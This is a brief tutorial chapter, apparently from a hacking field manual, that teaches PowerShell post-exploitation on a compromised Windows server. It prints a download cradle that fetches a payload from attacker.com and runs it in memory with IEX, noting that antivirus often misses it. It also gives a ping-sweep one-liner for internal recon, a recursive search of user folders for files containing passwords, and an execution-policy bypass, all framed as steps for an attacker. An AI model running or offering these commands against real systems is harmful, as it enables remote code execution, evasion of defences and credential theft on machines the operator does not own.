# Chapter 6.3: PowerShell for Hackers

---

## Living off the Land

If you compromise a Windows Server, you do not need to download tools. You have **PowerShell**.
It is installed by default, trusted by the OS, and incredibly powerful.

## The Download Cradle

You need to download your payload, but there is no `wget` or `curl` on older Windows boxes.

**The Command:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```
`IEX` (Invoke-Expression) runs the script immediately in memory. It never touches the disk. Antivirus often misses this.

## Network Recon

You want to scan the internal network but can't install Nmap.

**The Loop:**
```powershell
1..255 | % {echo "192.168.1.$_"; Test-Connection -Count 1 -ComputerName 192.168.1.$_ -Quiet}
```
This is a "Ping Sweep" written in one line of native code.

## File Hunting

You are looking for passwords.

```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.config,*.xml -Recurse | Select-String -Pattern "password"
```
This searches every user folder recursively for typical config files containing the string "password".

## Execution Policy Bypass

If the server says "Scripts disabled," just ignore it.
```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
```

PowerShell is not just a shell. It is the administration framework. If you control it, you control the machine.

---

" Bash is for Linux. PowerShell is for Empires."
Marliz Intel Field Manual
